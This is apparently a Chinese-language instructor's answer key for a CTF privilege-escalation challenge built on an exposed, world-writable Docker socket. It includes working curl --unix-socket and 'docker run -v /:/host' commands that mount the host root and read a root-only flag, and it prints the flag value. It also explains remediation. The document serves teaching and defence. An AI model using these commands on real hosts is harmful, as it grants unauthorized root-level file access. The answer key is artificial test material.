# 第 9 题（教师版）：Docker socket 暴露

> **唯一提权面**：`/var/run/docker.sock` 权限 `srw-rw-rw-`（所有人可写），一个**只读**的 Docker API 端点在监听。
> **唯一解**：通过 socket 调 API 创建一个带 `Binds:["/:/host"]` 的“容器”，读取 `/host/flag.txt`。
> **已刻意堵死**：`player` 无 sudo、不在 docker 组；`/var/lib/dockersim` 为 `0700 root`；
> 没有自定义 SUID/cron 提权面；直接 `cat /flag.txt` 不行。

## 一、预置环境

| 路径 | 权限 | 说明 |
|---|---|---|
| `/flag.txt` | `root:root 0400` | **运行时生成**（容器首启，`entrypoint.sh` 写入） |
| `/var/run/docker.sock` | `srw-rw-rw-` | **唯一提权面**，只读端点监听 |
| `/var/lib/dockersim/hostroot/` | `root:root 0755`，父目录 `0700` | “宿主根视图”，flag 副本由 `project-init.sh` 在运行时注入 |
| `/usr/local/sbin/dockerd-sim.py` | `root:root 0755` | API 端点程序（无 subprocess） |

`player`：uid 1001，无 sudo、无 docker 组，只靠 socket 的 `666` 权限访问端点。

## 二、唯一解

### 第一步：确认 socket 可访问

```bash
ls -l /var/run/docker.sock
# srw-rw-rw- 1 root root /var/run/docker.sock

curl -s --unix-socket /var/run/docker.sock http://localhost/version
# {"Version":"24.0.7", ...}
```

### 第二步：创建容器，把宿主根挂到 /host，启动并读日志

```bash
CID=$(curl -s --unix-socket /var/run/docker.sock -X POST \
  -H 'Content-Type: application/json' \
  -d '{"Image":"alpine","Cmd":["cat","/host/flag.txt"],"Binds":["/:/host"]}' \
  http://localhost/containers/create | jq -r .Id)

curl -s --unix-socket /var/run/docker.sock -X POST \
  http://localhost/containers/$CID/start

curl -s --unix-socket /var/run/docker.sock \
  http://localhost/containers/$CID/logs
# [sim] bind /var/lib/dockersim/hostroot -> /host (read-only host root view)
# Ly_Flag{bl6c0a21}
```

### 关键点讲解

- **能访问 docker.sock ≈ root**：daemon 以 root 运行，能调它 API 的人就能申请宿主根挂载、读任意文件。
- 这就是“加到 docker 组 = 给 root”的原因。
- 真实环境里客户端是 `docker -H unix:///var/run/docker.sock run --rm -v /:/host alpine cat /host/flag.txt`，
  或直接 `curl --unix-socket`。本题端点行为与真实读取一致。
- 修复：socket 权限改为 `660 root:docker`；不要随便把用户加进 docker 组；需要隔离时用 rootless docker / podman。

## 三、为什么只有这一条解

| 思路 | 失败原因 |
|---|---|
| `cat /flag.txt` | 0400 root |
| `cat /var/lib/dockersim/hostroot/flag.txt` | 父目录 0700 root |
| `sudo` | 未授权 |
| 找其他 SUID/cron | 本题未预置其他提权面 |
| `Binds` 挂 `/etc` 等非根路径 | 端点策略：只接受 `/` 作为挂载源，返回 400 |
| `Cmd` 里要 `sh` / `bash` | 端点策略：命令白名单只有 cat/ls/id/whoami/uname，返回 400 |
| `cat /host/../../flag.txt` 穿越 | `realpath` 收敛检查，判定越出宿主视图后拒绝 |

## 四、单解验证

```bash
# 正向：见上
# 负向
cat /flag.txt                                  # Permission denied
cat /var/lib/dockersim/hostroot/flag.txt       # Permission denied
printf 'Player@2026\n' | sudo -S -k id         # not in the sudoers file
# 端点策略
curl ... -d '{"Cmd":["cat","/e/shadow"],"Binds":["/etc:/e"]}'   # bind source '/etc' rejected
curl ... -d '{"Cmd":["sh","-c","id"],"Binds":["/:/host"]}'      # command 'sh' not permitted
curl ... -d '{"Cmd":["cat","/host/../../flag.txt"]}'            # outside container rootfs
```

## 五、关于“用户态模拟”的说明

真实 `dockerd` 需要 root 级别守护进程，与“只给端口和镜像名”的启动方式冲突。
本题用 Python 实现的 `dockerd-sim.py` 暴露核心 API（create/start/logs/wait/delete），
并以**只读**方式实现 `-v /:/host`：只接受 `/` 挂载、只接受五个只读命令、路径做 `realpath` 收敛、
程序内没有 `subprocess`。因此它演示了“socket=root 的读取面”，同时**不构成真实容器逃逸**。
启动方式不变，学生体验与真实 docker 一致。真实版部署见 `deploy.md` 第七节（仅在隔离实验机上使用）。
